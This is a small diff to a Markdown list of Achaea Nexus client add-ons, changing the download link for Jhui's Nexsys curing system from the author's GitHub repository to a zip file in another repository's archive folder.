@@ -100,7 +100,7 @@
 
 ##### Jhui's Nexsys
    Info: [Curing system for Achaea Nexus Client (super beta version)](https://forums.achaea.com/discussion/5020)  
-   Download: [Github](https://github.com/jhuiAchaea/Nexsys)  
+   Download: [Github](https://raw.githubusercontent.com/VinzentObuun/TTG/master/archive/Nexsys.zip)  
 
 ##### Voka's Character NDB
    Info: [Character DB](https://forums.achaea.com/discussion/6527)  
